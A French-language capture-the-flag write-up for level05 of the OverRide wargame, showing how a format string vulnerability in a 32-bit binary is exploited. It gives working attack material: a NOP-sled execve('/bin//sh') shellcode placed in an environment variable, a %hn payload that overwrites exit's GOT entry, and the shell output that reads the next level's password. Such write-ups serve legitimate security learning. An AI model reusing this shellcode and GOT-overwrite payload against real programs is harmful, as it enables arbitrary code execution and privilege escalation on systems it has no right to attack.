# level05

La boucle transforme les majuscules en minuscules. On se retrouve face à une `Format String Vulnerability`.

La fonction printf écrit au 10e emplacement :
```bash
level05@OverRide:~$ ./level05
aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

On va tenter de changer la valeur de l'addresse d'exit.

On trouve l'adresse de la fonction exit dans le programme :

```bash
level05@OverRide:~$ objdump -R level05 

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
080497e0 R_386_JUMP_SLOT   exit
```

On prépare notre payload dans une variable d'environnement :
```bash
export PAYLOAD=$(perl -e 'print "\x90"x100 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";')
```
On trouve l'adresse de notre variable d'environnement :
```as
(gdb) x/30s *((char **)environ)
...
0xffffdf38:     "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
```
On ajoute 8 pour prendre en compte "PAYLOAD=" : `0xffffdf40`

On prépare ensuite notre input. On ne peut pas tout écrire d'un coup donc on va couper notre payload en deux :
```bash
\xe0\x97\x04\x08
\xe2\x97\x04\x08
```
On a une adresse qui finit par `df40` ce qui donne `57152` à écrire, et on a déjà `8` caractères pour la fonction `exit`, donc il nous faut `57144` caractères pour la première partie.
Le début de l'adresse est `ffff` donc il nous faudra `65535`, mais on aura en déjà écrit beaucoup donc il ne nous restera plus que `8383` caractères à écrire pour la deuxième partie.

Ce qui nous donne le payload suivant :
```bash
perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%57144x%10\$hn" . "%8383x%11\$hn";' > /tmp/payload
```

```bash
level05@OverRide:~$ cat /tmp/payload - | ./level05

�
...

f7fcfac0
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```